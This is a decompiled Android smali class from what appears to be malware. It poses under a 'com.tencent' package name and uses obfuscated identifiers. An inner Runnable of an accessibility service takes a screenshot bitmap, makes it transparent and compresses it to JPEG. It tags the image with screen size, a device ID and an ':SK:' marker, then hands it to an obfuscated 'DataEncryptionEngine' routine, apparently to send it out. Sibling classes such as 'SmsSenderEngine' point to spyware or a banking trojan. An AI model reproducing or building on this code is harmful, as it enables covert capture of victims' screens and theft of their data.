.class Lcom/tencent/AccessibilityServiceCore$8$1;
.super Ljava/lang/Object;
.source "tunesxconcerningn1012.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/AccessibilityServiceCore$8;->onSuccess(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$1:Lcom/tencent/AccessibilityServiceCore$8;

.field final synthetic val$Sc_bitmap:Landroid/graphics/Bitmap;


# direct methods
.method constructor <init>(Lcom/tencent/AccessibilityServiceCore$8;Landroid/graphics/Bitmap;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 948
    iput-object p1, p0, Lcom/tencent/AccessibilityServiceCore$8$1;->this$1:Lcom/tencent/AccessibilityServiceCore$8;

    iput-object p2, p0, Lcom/tencent/AccessibilityServiceCore$8$1;->val$Sc_bitmap:Landroid/graphics/Bitmap;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    const-string v0, ":"

    .line 951
    :try_start_0
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 953
    iget-object v2, p0, Lcom/tencent/AccessibilityServiceCore$8$1;->val$Sc_bitmap:Landroid/graphics/Bitmap;

    invoke-virtual {v2}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v3

    iget-object v4, p0, Lcom/tencent/AccessibilityServiceCore$8$1;->val$Sc_bitmap:Landroid/graphics/Bitmap;

    invoke-virtual {v4}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v4

    const/4 v5, 0x0

    invoke-static {v2, v5, v5, v3, v4}, Landroid/graphics/Bitmap;->createBitmap(Landroid/graphics/Bitmap;IIII)Landroid/graphics/Bitmap;

    move-result-object v2

    const/16 v3, 0x30

    .line 955
    invoke-static {v2, v3}, Lcom/tencent/AccessibilityServiceCore;->getTransparentBitmap(Landroid/graphics/Bitmap;I)Landroid/graphics/Bitmap;

    move-result-object v2

    .line 956
    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v4, 0x14

    invoke-virtual {v2, v3, v4, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 958
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v1

    .line 959
    iget-object v2, p0, Lcom/tencent/AccessibilityServiceCore$8$1;->this$1:Lcom/tencent/AccessibilityServiceCore$8;

    iget-object v2, v2, Lcom/tencent/AccessibilityServiceCore$8;->this$0:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v2}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "SCH"

    const-string v4, "720"

    invoke-static {v2, v3, v4}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 960
    iget-object v3, p0, Lcom/tencent/AccessibilityServiceCore$8$1;->this$1:Lcom/tencent/AccessibilityServiceCore$8;

    iget-object v3, v3, Lcom/tencent/AccessibilityServiceCore$8;->this$0:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v3}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "SCW"

    const-string v5, "1080"

    invoke-static {v3, v4, v5}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 964
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v5, Lcom/tencent/DataPackagingEngine;->s_tunesxconcerningn103_cr:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lcom/tencent/SmsSenderEngine;->PID:Ljava/lang/String;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ":SK:"

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v1}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 972
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    return-void
.end method
